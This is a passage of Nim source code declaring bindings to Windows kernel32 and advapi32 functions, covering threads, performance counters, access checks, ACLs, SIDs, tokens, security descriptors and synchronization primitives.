dynlib: "kernel32", importc.}proc SetProcessMitigationPolicy*(MitigationPolicy: PROCESS_MITIGATION_POLICY, lpBuffer: PVOID, dwLength: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessMitigationPolicy*(hProcess: HANDLE, MitigationPolicy: PROCESS_MITIGATION_POLICY, lpBuffer: PVOID, dwLength: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentProcess*(): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentProcessId*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentThread*(): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentThreadId*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsProcessorFeaturePresent*(ProcessorFeature: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlushProcessWriteBuffers*(): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThread*(lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadPriority*(hThread: HANDLE, nPriority: int32): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadPriority*(hThread: HANDLE): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc ExitThread*(dwExitCode: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetExitCodeThread*(hThread: HANDLE, lpExitCode: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SuspendThread*(hThread: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ResumeThread*(hThread: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc TlsAlloc*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc TlsGetValue*(dwTlsIndex: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc TlsSetValue*(dwTlsIndex: DWORD, lpTlsValue: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TlsFree*(dwTlsIndex: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadIdealProcessorEx*(hThread: HANDLE, lpIdealProcessor: PPROCESSOR_NUMBER, lpPreviousIdealProcessor: PPROCESSOR_NUMBER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessGroupAffinity*(hProcess: HANDLE, GroupCount: PUSHORT, GroupArray: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadGroupAffinity*(hThread: HANDLE, GroupAffinity: PGROUP_AFFINITY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadGroupAffinity*(hThread: HANDLE, GroupAffinity: ptr GROUP_AFFINITY, PreviousGroupAffinity: PGROUP_AFFINITY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryPerformanceCounter*(lpPerformanceCount: ptr LARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryPerformanceFrequency*(lpFrequency: ptr LARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryThreadCycleTime*(ThreadHandle: HANDLE, CycleTime: PULONG64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryProcessCycleTime*(ProcessHandle: HANDLE, CycleTime: PULONG64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryIdleProcessorCycleTime*(BufferLength: PULONG, ProcessorIdleCycleTime: PULONG64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryIdleProcessorCycleTimeEx*(Group: USHORT, BufferLength: PULONG, ProcessorIdleCycleTime: PULONG64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryUnbiasedInterruptTime*(UnbiasedTime: PULONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetAppContainerNamedObjectPath*(Token: HANDLE, AppContainerSid: PSID, ObjectPathLength: ULONG, ObjectPath: LPWSTR, ReturnLength: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AccessCheck*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, ClientToken: HANDLE, DesiredAccess: DWORD, GenericMapping: PGENERIC_MAPPING, PrivilegeSet: PPRIVILEGE_SET, PrivilegeSetLength: LPDWORD, GrantedAccess: LPDWORD, AccessStatus: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckAndAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPWSTR, ObjectName: LPWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, DesiredAccess: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByType*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, ClientToken: HANDLE, DesiredAccess: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, PrivilegeSet: PPRIVILEGE_SET, PrivilegeSetLength: LPDWORD, GrantedAccess: LPDWORD, AccessStatus: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeResultList*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, ClientToken: HANDLE, DesiredAccess: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, PrivilegeSet: PPRIVILEGE_SET, PrivilegeSetLength: LPDWORD, GrantedAccessList: LPDWORD, AccessStatusList: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeAndAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeResultListAndAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccessList: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeResultListAndAuditAlarmByHandleW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ClientToken: HANDLE, ObjectTypeName: LPCWSTR, ObjectName: LPCWSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccessList: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessAllowedAce*(pAcl: PACL, dwAceRevision: DWORD, AccessMask: DWORD, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessAllowedAceEx*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessAllowedObjectAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, ObjectTypeGuid: ptr GUID, InheritedObjectTypeGuid: ptr GUID, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessDeniedAce*(pAcl: PACL, dwAceRevision: DWORD, AccessMask: DWORD, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessDeniedAceEx*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAccessDeniedObjectAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, ObjectTypeGuid: ptr GUID, InheritedObjectTypeGuid: ptr GUID, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAce*(pAcl: PACL, dwAceRevision: DWORD, dwStartingAceIndex: DWORD, pAceList: LPVOID, nAceListLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAuditAccessAce*(pAcl: PACL, dwAceRevision: DWORD, dwAccessMask: DWORD, pSid: PSID, bAuditSuccess: WINBOOL, bAuditFailure: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAuditAccessAceEx*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, dwAccessMask: DWORD, pSid: PSID, bAuditSuccess: WINBOOL, bAuditFailure: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddAuditAccessObjectAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, ObjectTypeGuid: ptr GUID, InheritedObjectTypeGuid: ptr GUID, pSid: PSID, bAuditSuccess: WINBOOL, bAuditFailure: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddMandatoryAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, MandatoryPolicy: DWORD, pLabelSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AddResourceAttributeAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, pSid: PSID, pAttributeInfo: PCLAIM_SECURITY_ATTRIBUTES_INFORMATION, pReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddScopedPolicyIDAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AccessMask: DWORD, pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AdjustTokenGroups*(TokenHandle: HANDLE, ResetToDefault: WINBOOL, NewState: PTOKEN_GROUPS, BufferLength: DWORD, PreviousState: PTOKEN_GROUPS, ReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AdjustTokenPrivileges*(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL, NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AllocateAndInitializeSid*(pIdentifierAuthority: PSID_IDENTIFIER_AUTHORITY, nSubAuthorityCount: BYTE, nSubAuthority0: DWORD, nSubAuthority1: DWORD, nSubAuthority2: DWORD, nSubAuthority3: DWORD, nSubAuthority4: DWORD, nSubAuthority5: DWORD, nSubAuthority6: DWORD, nSubAuthority7: DWORD, pSid: ptr PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AllocateLocallyUniqueId*(Luid: PLUID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AreAllAccessesGranted*(GrantedAccess: DWORD, DesiredAccess: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AreAnyAccessesGranted*(GrantedAccess: DWORD, DesiredAccess: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CheckTokenMembership*(TokenHandle: HANDLE, SidToCheck: PSID, IsMember: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CheckTokenCapability*(TokenHandle: HANDLE, CapabilitySidToCheck: PSID, HasCapability: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetAppContainerAce*(Acl: PACL, StartingAceIndex: DWORD, AppContainerAce: ptr PVOID, AppContainerAceIndex: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CheckTokenMembershipEx*(TokenHandle: HANDLE, SidToCheck: PSID, Flags: DWORD, IsMember: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ConvertToAutoInheritPrivateObjectSecurity*(ParentDescriptor: PSECURITY_DESCRIPTOR, CurrentSecurityDescriptor: PSECURITY_DESCRIPTOR, NewSecurityDescriptor: ptr PSECURITY_DESCRIPTOR, ObjectType: ptr GUID, IsDirectoryObject: BOOLEAN, GenericMapping: PGENERIC_MAPPING): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CopySid*(nDestinationSidLength: DWORD, pDestinationSid: PSID, pSourceSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreatePrivateObjectSecurity*(ParentDescriptor: PSECURITY_DESCRIPTOR, CreatorDescriptor: PSECURITY_DESCRIPTOR, NewDescriptor: ptr PSECURITY_DESCRIPTOR, IsDirectoryObject: WINBOOL, Token: HANDLE, GenericMapping: PGENERIC_MAPPING): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreatePrivateObjectSecurityEx*(ParentDescriptor: PSECURITY_DESCRIPTOR, CreatorDescriptor: PSECURITY_DESCRIPTOR, NewDescriptor: ptr PSECURITY_DESCRIPTOR, ObjectType: ptr GUID, IsContainerObject: WINBOOL, AutoInheritFlags: ULONG, Token: HANDLE, GenericMapping: PGENERIC_MAPPING): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreatePrivateObjectSecurityWithMultipleInheritance*(ParentDescriptor: PSECURITY_DESCRIPTOR, CreatorDescriptor: PSECURITY_DESCRIPTOR, NewDescriptor: ptr PSECURITY_DESCRIPTOR, ObjectTypes: ptr ptr GUID, GuidCount: ULONG, IsContainerObject: WINBOOL, AutoInheritFlags: ULONG, Token: HANDLE, GenericMapping: PGENERIC_MAPPING): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreateRestrictedToken*(ExistingTokenHandle: HANDLE, Flags: DWORD, DisableSidCount: DWORD, SidsToDisable: PSID_AND_ATTRIBUTES, DeletePrivilegeCount: DWORD, PrivilegesToDelete: PLUID_AND_ATTRIBUTES, RestrictedSidCount: DWORD, SidsToRestrict: PSID_AND_ATTRIBUTES, NewTokenHandle: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreateWellKnownSid*(WellKnownSidType: WELL_KNOWN_SID_TYPE, DomainSid: PSID, pSid: PSID, cbSid: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc EqualDomainSid*(pSid1: PSID, pSid2: PSID, pfEqual: ptr WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DeleteAce*(pAcl: PACL, dwAceIndex: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DestroyPrivateObjectSecurity*(ObjectDescriptor: ptr PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DuplicateToken*(ExistingTokenHandle: HANDLE, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL, DuplicateTokenHandle: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DuplicateTokenEx*(hExistingToken: HANDLE, dwDesiredAccess: DWORD, lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL, TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc EqualPrefixSid*(pSid1: PSID, pSid2: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc EqualSid*(pSid1: PSID, pSid2: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc FindFirstFreeAce*(pAcl: PACL, pAce: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc FreeSid*(pSid: PSID): PVOID {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetAce*(pAcl: PACL, dwAceIndex: DWORD, pAce: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetAclInformation*(pAcl: PACL, pAclInformation: LPVOID, nAclInformationLength: DWORD, dwAclInformationClass: ACL_INFORMATION_CLASS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetFileSecurityW*(lpFileName: LPCWSTR, RequestedInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR, nLength: DWORD, lpnLengthNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetKernelObjectSecurity*(Handle: HANDLE, RequestedInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR, nLength: DWORD, lpnLengthNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetLengthSid*(pSid: PSID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetPrivateObjectSecurity*(ObjectDescriptor: PSECURITY_DESCRIPTOR, SecurityInformation: SECURITY_INFORMATION, ResultantDescriptor: PSECURITY_DESCRIPTOR, DescriptorLength: DWORD, ReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorControl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, pControl: PSECURITY_DESCRIPTOR_CONTROL, lpdwRevision: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorDacl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, lpbDaclPresent: LPBOOL, pDacl: ptr PACL, lpbDaclDefaulted: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorGroup*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, pGroup: ptr PSID, lpbGroupDefaulted: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorLength*(pSecurityDescriptor: PSECURITY_DESCRIPTOR): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorOwner*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, pOwner: ptr PSID, lpbOwnerDefaulted: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorRMControl*(SecurityDescriptor: PSECURITY_DESCRIPTOR, RMControl: PUCHAR): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSecurityDescriptorSacl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, lpbSaclPresent: LPBOOL, pSacl: ptr PACL, lpbSaclDefaulted: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSidIdentifierAuthority*(pSid: PSID): PSID_IDENTIFIER_AUTHORITY {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSidLengthRequired*(nSubAuthorityCount: UCHAR): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSidSubAuthority*(pSid: PSID, nSubAuthority: DWORD): PDWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetSidSubAuthorityCount*(pSid: PSID): PUCHAR {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetTokenInformation*(TokenHandle: HANDLE, TokenInformationClass: TOKEN_INFORMATION_CLASS, TokenInformation: LPVOID, TokenInformationLength: DWORD, ReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetWindowsAccountDomainSid*(pSid: PSID, pDomainSid: PSID, cbDomainSid: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ImpersonateAnonymousToken*(ThreadHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ImpersonateLoggedOnUser*(hToken: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ImpersonateSelf*(ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc InitializeAcl*(pAcl: PACL, nAclLength: DWORD, dwAclRevision: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc InitializeSecurityDescriptor*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, dwRevision: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc InitializeSid*(Sid: PSID, pIdentifierAuthority: PSID_IDENTIFIER_AUTHORITY, nSubAuthorityCount: BYTE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsTokenRestricted*(TokenHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsValidAcl*(pAcl: PACL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsValidSecurityDescriptor*(pSecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsValidSid*(pSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsWellKnownSid*(pSid: PSID, WellKnownSidType: WELL_KNOWN_SID_TYPE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc MakeAbsoluteSD*(pSelfRelativeSecurityDescriptor: PSECURITY_DESCRIPTOR, pAbsoluteSecurityDescriptor: PSECURITY_DESCRIPTOR, lpdwAbsoluteSecurityDescriptorSize: LPDWORD, pDacl: PACL, lpdwDaclSize: LPDWORD, pSacl: PACL, lpdwSaclSize: LPDWORD, pOwner: PSID, lpdwOwnerSize: LPDWORD, pPrimaryGroup: PSID, lpdwPrimaryGroupSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc MakeSelfRelativeSD*(pAbsoluteSecurityDescriptor: PSECURITY_DESCRIPTOR, pSelfRelativeSecurityDescriptor: PSECURITY_DESCRIPTOR, lpdwBufferLength: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc MapGenericMask*(AccessMask: PDWORD, GenericMapping: PGENERIC_MAPPING): VOID {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectCloseAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectDeleteAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectOpenAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ObjectTypeName: LPWSTR, ObjectName: LPWSTR, pSecurityDescriptor: PSECURITY_DESCRIPTOR, ClientToken: HANDLE, DesiredAccess: DWORD, GrantedAccess: DWORD, Privileges: PPRIVILEGE_SET, ObjectCreation: WINBOOL, AccessGranted: WINBOOL, GenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectPrivilegeAuditAlarmW*(SubsystemName: LPCWSTR, HandleId: LPVOID, ClientToken: HANDLE, DesiredAccess: DWORD, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc PrivilegeCheck*(ClientToken: HANDLE, RequiredPrivileges: PPRIVILEGE_SET, pfResult: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc PrivilegedServiceAuditAlarmW*(SubsystemName: LPCWSTR, ServiceName: LPCWSTR, ClientToken: HANDLE, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc QuerySecurityAccessMask*(SecurityInformation: SECURITY_INFORMATION, DesiredAccess: LPDWORD): VOID {.winapi, stdcall, dynlib: "advapi32", importc.}proc RevertToSelf*(): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetAclInformation*(pAcl: PACL, pAclInformation: LPVOID, nAclInformationLength: DWORD, dwAclInformationClass: ACL_INFORMATION_CLASS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetFileSecurityW*(lpFileName: LPCWSTR, SecurityInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetKernelObjectSecurity*(Handle: HANDLE, SecurityInformation: SECURITY_INFORMATION, SecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetPrivateObjectSecurity*(SecurityInformation: SECURITY_INFORMATION, ModificationDescriptor: PSECURITY_DESCRIPTOR, ObjectsSecurityDescriptor: ptr PSECURITY_DESCRIPTOR, GenericMapping: PGENERIC_MAPPING, Token: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetPrivateObjectSecurityEx*(SecurityInformation: SECURITY_INFORMATION, ModificationDescriptor: PSECURITY_DESCRIPTOR, ObjectsSecurityDescriptor: ptr PSECURITY_DESCRIPTOR, AutoInheritFlags: ULONG, GenericMapping: PGENERIC_MAPPING, Token: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityAccessMask*(SecurityInformation: SECURITY_INFORMATION, DesiredAccess: LPDWORD): VOID {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorControl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, ControlBitsOfInterest: SECURITY_DESCRIPTOR_CONTROL, ControlBitsToSet: SECURITY_DESCRIPTOR_CONTROL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorDacl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, bDaclPresent: WINBOOL, pDacl: PACL, bDaclDefaulted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorGroup*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, pGroup: PSID, bGroupDefaulted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorOwner*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, pOwner: PSID, bOwnerDefaulted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorRMControl*(SecurityDescriptor: PSECURITY_DESCRIPTOR, RMControl: PUCHAR): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetSecurityDescriptorSacl*(pSecurityDescriptor: PSECURITY_DESCRIPTOR, bSaclPresent: WINBOOL, pSacl: PACL, bSaclDefaulted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetTokenInformation*(TokenHandle: HANDLE, TokenInformationClass: TOKEN_INFORMATION_CLASS, TokenInformation: LPVOID, TokenInformationLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetCachedSigningLevel*(SourceFiles: PHANDLE, SourceFileCount: ULONG, Flags: ULONG, TargetFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCachedSigningLevel*(File: HANDLE, Flags: PULONG, SigningLevel: PULONG, Thumbprint: PUCHAR, ThumbprintSize: PULONG, ThumbprintAlgorithm: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnterCriticalSection*(lpCriticalSection: LPCRITICAL_SECTION): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc LeaveCriticalSection*(lpCriticalSection: LPCRITICAL_SECTION): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc TryEnterCriticalSection*(lpCriticalSection: LPCRITICAL_SECTION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteCriticalSection*(lpCriticalSection: LPCRITICAL_SECTION): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEvent*(hEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ResetEvent*(hEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseSemaphore*(hSemaphore: HANDLE, lReleaseCount: LONG, lpPreviousCount: LPLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseMutex*(hMutex: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForSingleObjectEx*(hHandle: HANDLE, dwMilliseconds: DWORD, bAlertable: WINBOOL): DWORD 